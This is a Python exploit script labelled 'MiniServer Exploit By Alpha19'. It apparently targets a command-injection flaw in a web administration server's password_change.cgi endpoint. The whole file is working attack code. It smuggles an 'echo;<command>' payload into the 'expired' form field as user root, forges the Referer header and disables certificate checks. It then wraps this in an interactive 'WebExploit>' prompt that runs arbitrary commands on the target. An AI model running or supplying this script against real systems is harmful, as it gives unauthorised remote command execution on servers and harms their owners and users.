from optparse import OptionParser
import requests

requests.packages.urllib3.disable_warnings() 

Parser = OptionParser()
Parser.add_option("-u", "--url", dest="url", help = "URL to exploit")

(options, args) = Parser.parse_args()

url = options.url

def Exploit(url, comm):
	res = requests.post(url + "/password_change.cgi", data = {"user": "root", "pam": "", "expired": "echo;{}".format(comm)},
			headers = {"Referer": "{}/session_login.cgi".format(url)}, verify = False)
	print(res.text.split("<p>Your password has expired, and a new one must be chosen.")[-1][:-5])

def Prompt():
	comm = input("WebExploit> ")

	if comm == 'exit':
		print("Bye")
		exit()
	else:
		return comm

print("\t\tMiniServer Exploit By Alpha19")

if url == None:
	print("[+] Usage: python3 MiniExploit.py -u <URL> [+]")
	exit()

if url[-1] == '/':
	url = url[:-1]
	
while True:
	comms = Prompt()
	Exploit(url, comms)